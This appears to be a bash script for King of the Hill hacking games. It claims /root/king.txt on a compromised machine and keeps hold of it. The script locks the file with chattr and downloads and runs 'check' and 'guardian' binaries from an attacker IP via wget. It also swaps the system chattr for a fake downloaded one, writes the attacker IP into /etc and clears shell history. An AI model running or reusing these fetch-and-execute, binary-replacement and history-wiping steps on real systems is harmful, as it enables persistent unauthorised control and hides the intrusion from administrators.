#!/bin/bash
# Created by @H3X-007 ;)

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' 


banner="
${RED}    _____                   _______               _____                    _____          
         /\    \                 /::\    \             /\    \                  /\    \         
        /::\____\               /::::\    \           /::\    \                /::\____\        
       /:::/    /              /::::::\    \          \:::\    \              /:::/    /        
      /:::/    /              /::::::::\    \          \:::\    \            /:::/    /         
     /:::/    /              /:::/~~\:::\    \          \:::\    \          /:::/    /          
    /:::/____/              /:::/    \:::\    \          \:::\    \        /:::/____/           
   /::::\    \             /:::/    / \:::\    \          \:::\    \      /::::\    \           
  /::::::\____\________   /:::/____/   \:::\____\       /::::::\    \    /::::::\    \   _____  
 /:::/\:::::::::::\    \ |:::|    |     |:::|    |     /:::/\:::\    \  /:::/\:::\    \ /\    \ 
/:::/  |:::::::::::\____\|:::|____|     |:::|    |    /:::/  \:::\____\/:::/  \:::\    /::\____\
\::/   |::|~~~|~~~~~      \:::\    \   /:::/    /    /:::/    \::/    /\::/    \:::\  /:::/    /
 \/____|::|   |            \:::\    \ /:::/    /    /:::/    / \/____/  \/____/ \:::\/:::/    / 
       |::|   |             \:::\    /:::/    /    /:::/    /                    \::::::/    /  
       |::|   |              \:::\__/:::/    /    /:::/    /                      \::::/    /   
       |::|   |               \::::::::/    /     \::/    /                       /:::/    /    
       |::|   |                \::::::/    /       \/____/                       /:::/    /     
       |::|   |                 \::::/    /                                     /:::/    /      
       \::|   |                  \::/____/                                     /:::/    /       
        \:|   |                   ~~                                           \::/    /        
         \|___|                                                                 \/____/         
${RED}"


echo -e "$banner"

echo
echo -e "${GREEN}Hi, I am The KOTH Script ... I have been created by H3X-007 to make sure you are the KING :) I'm kind :D${NC}"
echo
echo -e "${GREEN}Join our Discord Server: ${BLUE}https://discord.gg/y3aCGbrT8J${NC}"
echo
echo -e "${YELLOW}-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------${NC}"
echo 
read -p "Enter your nickname: " nick
read -p "What is your VPN IP ?: " IP
echo -e "Hello ${RED}$nick${NC} :) Let's go"
echo 
echo -e "${YELLOW}-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------${NC}"
echo 
chmod +x /usr/bin/chattr
set write off
sudo chattr -ai /root/king.txt
echo "$nick" >> /root/king.txt
echo "$nick" | sudo tee /root/king.txt >/dev/null
sudo chattr +ai /root/king.txt
sudo chmod 400 /root/king.txt
set -o noclobber /root/king.txt
echo 
echo
echo -e "${YELLOW}-----------------------------------------------------------------------------"
echo 
echo "Files Operation Complete... Starting Operation 2..."
echo 
echo -e "${YELLOW}-----------------------------------------------------------------------------${NC}"
echo
echo -e "${GREEN}Let's Go Forward... :)${NC}"
echo
echo -e "${YELLOW}-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------${NC}"
echo
cd /usr/bin && wget http://$IP/check && chmod +x check 
./check &
cd /usr/bin && wget http://$IP/guardian && chmod +x guardian 
./guardian &
chattr +ai /usr/bin/check && chattr +ai /usr/bin/guardian
echo
echo -e "${GREEN}--------------------File successfully running in the background---------------${NC}"
echo -e "${YELLOW}-----------------------------------------------------------------------------${NC}"
echo
rm -rf /usr/bin/chattr && cd /usr/bin && wget http://$IP/chattr && chmod +x chattr
echo
echo -e "${GREEN}------------------Fake chattr successfully added-----------------${NC}"
echo -e "${YELLOW}-----------------------------------------------------------------${NC}"
echo "$IP" > /etc/HOST &
echo "$nick" > /etc/nick &
history -c
echo
echo -e "${YELLOW}-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------${NC}"
echo
echo -e "${GREEN}Operation Fully Complete. The KING is ${RED}$nick${GREEN}! :)${NC}"
echo
echo -e "${YELLOW}--------------Hi ${RED}$nick${YELLOW}, don't forget to give us a star on Github--------------${NC}"
echo -e "${YELLOW}-----------------------------------------------------------------------------${NC}"
